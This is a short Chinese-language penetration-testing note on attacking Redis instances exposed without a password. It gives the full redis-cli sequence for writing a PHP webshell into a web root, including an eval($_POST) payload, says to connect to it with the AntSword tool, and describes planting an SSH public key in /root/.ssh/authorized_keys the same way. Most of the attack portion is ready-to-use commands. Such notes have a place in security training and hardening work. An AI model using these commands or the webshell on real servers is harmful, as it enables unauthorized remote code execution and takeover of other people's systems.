---
title: Redis漏洞
date: 2026-06-09
categories:
  - 特定场景渗透
  - 未授权漏洞
tags: []
---

[https://www.freebuf.com/articles/web/289231.html](https://www.freebuf.com/articles/web/289231.html)

## 什么是Redis：

Redis是一种NOSQL，即非关系型数据库，存储的是键值对，可以用于数据库，或者消息中间件

## Redis未授权访问：

redis默认的情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，会使redis暴露在公网上，如果没有设置登录密码，会导致任意用户访问

当目标开启了web服务，我们就可以使用kali连接上redis并且执行写入webshell的操作

```shell
config set dir 网站根目录
config set dbfilename webshell.php //在磁盘中生成webshell
set xxx "\n\n\n<?php @eval($_POST['name']);?>\n\n\n"//写入恶意代码进入内存，要换行
save //将内存数据导出到磁盘
```

之后可以使用蚁剑链接即可

## Redis写入webshell

### 原理：

redis存在未授权访问，并且开启了web服务，知道了web目录的路径，并且具有文件读写增删改查的权限



## Redis密钥登录ssh

### 原理：

在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh在生成一个授权的key

